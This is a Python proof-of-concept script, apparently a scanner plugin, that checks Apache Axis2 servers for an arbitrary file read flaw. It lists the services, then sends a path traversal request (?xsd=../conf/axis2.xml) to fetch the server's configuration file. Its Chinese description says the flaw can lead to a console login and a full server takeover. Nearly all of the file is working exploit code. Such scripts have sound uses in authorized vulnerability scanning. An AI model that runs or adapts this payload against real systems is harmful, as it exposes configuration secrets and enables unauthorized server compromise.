#!/usr/bin/env python3
# -*- coding:utf-8 -*-

import re
import requests
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()

def get_plugin_info():
    plugin_info = {
        "name": "Axis2任意文件读取",
        "desc": "通过此漏洞可以读取配置文件等信息，进而登陆控制台，通过部署功能可直接获取服务器权限。",
        "grade": "高",
        "type": "web",
        "keyword": "tag:axis2"
    }
    return plugin_info

def poc(arg):
    arg = arg if "://" in arg else f"http://{arg}"
    timeout = 5
    headers = {
        'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36",
        'Referer': arg
        }
    try:
        r1 = requests.get(
            url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/axis2/services/listServices', 
            headers=headers,
            timeout=timeout, 
            verify=False
            )
        if r1.status_code == 404:
            return False
        m = re.search(r'/axis2/services/(.*?)\?wsdl">.*?</a>', r1.text)
        if m.group(1):
            server_str = m.group(1)
            r2 = requests.get(
                url=f'{urlparse(arg).scheme}://{urlparse(arg).netloc}/axis2/services/{server_str}?xsd=../conf/axis2.xml', 
                headers=headers,
                timeout=timeout, 
                verify=False
                )
            if 'axisconfig' in r2.text:
                return True
            else:
                return False
    except Exception:
        return 

if __name__ == '__main__':
    import sys
    if len(sys.argv) != 2:
        print("{} URL".format(sys.argv[0]))
    else:
        print("{} {}".format(sys.argv[1],poc(sys.argv[1])))  

